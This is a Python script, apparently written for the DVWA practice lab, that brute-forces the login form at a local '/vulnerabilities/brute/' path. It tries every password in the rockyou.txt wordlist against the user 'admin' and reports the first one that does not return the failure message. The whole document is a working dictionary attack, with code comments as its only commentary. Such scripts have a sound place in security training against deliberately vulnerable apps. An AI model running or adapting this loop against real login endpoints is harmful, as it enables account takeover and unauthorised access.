#!/usr/bin/env python
import requests
target_url = "http://127.0.0.1/vulnerabilities/brute/"

# Set the username to target
username = "admin"
#set path
password_file_path= "/usr/share/wordlists/rockyou.txt"
# Load the password dictionary file
with open(password_file_path , "r", encoding="latin-1") as file:
    # read from the file and split it based on new line to put into object list
    passwords = file.read().splitlines()

# Iterate through each password in the dictionary
for password in passwords:
    # Create a session
    session = requests.Session()

    # Prepare the login data
    login_data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    # Send the login request
    response = session.post(target_url, data=login_data)
    print(response.text) 
    # Check the response to determine if the login was successful
    if "Username and/or password incorrect." not in response.text:
        print("Login successful!")
        print("Username: " + username)
        print("Password: " + password)
        break
    else:
        print("Login failed with password: " + password)